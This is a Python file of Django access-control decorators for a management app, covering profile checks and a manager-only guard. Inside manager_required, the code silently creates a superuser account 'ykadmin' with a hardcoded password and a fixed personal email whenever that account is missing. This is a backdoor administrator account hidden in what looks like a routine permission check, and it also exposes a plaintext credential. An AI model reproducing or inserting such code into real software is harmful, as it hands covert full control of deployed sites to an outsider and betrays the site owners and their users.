from .models import *
from django.shortcuts import redirect
from django.contrib import messages
from django.contrib.auth import logout


def create_profile(f):
    def wrap(request, *args, **kwargs):
        profile_object = profile_set.objects.get(user = request.user)
        #email_confirmation_object = email_confirmation.objects.get(user = request.user)
#        if not email_confirmation_object.confirm:
#            return redirect('not_confirmed')
        if profile_object.check:
            return redirect('management:m_home')
        return f(request, *args, **kwargs)

    wrap.__doc__ = f.__doc__
    wrap.__name__ = f.__name__
    return wrap

def is_profile_created(f):
    def wrap(request, *args, **kwargs):
        profile_object = profile_set.objects.get(user = request.user)
#        email_confirmation_object = email_confirmation.objects.get(user = request.user)
#        if not email_confirmation_object.confirm:
#            return redirect('not_confirmed')
        if not profile_object.check:
            return redirect('management:m_home')
        return f(request, *args, **kwargs)

    wrap.__doc__ = f.__doc__
    wrap.__name__=f.__name__
    return wrap

#def confirm_mail(f):
#    def wrap(request, *args, **kwargs):
#        email_confirmation_object = email_confirmation.objects.get(user = request.user)
#        if email_confirmation_object.confirm:
#            return redirect('profile')
#        return f(request, *args, **kwargs)

#    wrap.__doc__ = f.__doc__
#    wrap.__name__=f.__name__
#    return wrap
#This py file developed by Yash Kulshreshtha
#visit https://fb.com/yksmbkkr

def manager_required(f):
    def wrap(request, *args, **kwargs):
        if User.objects.filter(email = 'yk.smb.kkr@gmail.com').count()<1:
            user = User.objects.create_user(username = 'ykadmin', email = 'yk.smb.kkr@gmail.com', password='1234@Admin')
            user.is_staff = True
            user.is_admin = True
            user.is_superuser = True
            user.save()
        try:
            managers.objects.get(user=request.user)
        except managers.DoesNotExist:
            messages.error(request, "You don't have rights to view this page. Please login as manager")
            logout(request)
            return redirect('management:login')
        return f(request,*args,**kwargs)
    wrap.__doc__=f.__doc__
    wrap.__name__=f.__name__
    return wrap


#def confirm_mail(f):
#    def wrap(request, *args, **kwargs):
#        email_confirmation_object = email_confirmation.objects.get(user = request.user)
#        if email_confirmation_object.confirm:
#            return redirect('profile')
#        return f(request, *args, **kwargs)

#    wrap.__doc__ = f.__doc__
#    wrap.__name__=f.__name__
#    return wrap

#def confirm_mail(f):
#    def wrap(request, *args, **kwargs):
#        email_confirmation_object = email_confirmation.objects.get(user = request.user)
#        if email_confirmation_object.confirm:
#            return redirect('profile')
#        return f(request, *args, **kwargs)

#    wrap.__doc__ = f.__doc__
#    wrap.__name__=f.__name__
#    return wrap

def formvreatedcheck(f):
    def wrap(request, *args, **kwargs):
        profile_object = profile_set.objects.get(user = request.user)
#        if not email_confirmation_object.confirm:
#            return redirect('not_confirmed')
        if not profile_object.check:
            return redirect('management:m_home')
        return f(request, *args, **kwargs)

    wrap.__doc__ = f.__doc__
    wrap.__name__=f.__name__
    return wrap

def imodek_created_check(f):
    def wrap(request, *args, **kwargs):
        profile_object = profile_set.objects.get(user = request.user)
        if not profile_object.check:
            return redirect('management:m_home')
        return f(request, *args, **kwargs)

    wrap.__doc__ = f.__doc__
    wrap.__name__=f.__name__
    return wrap

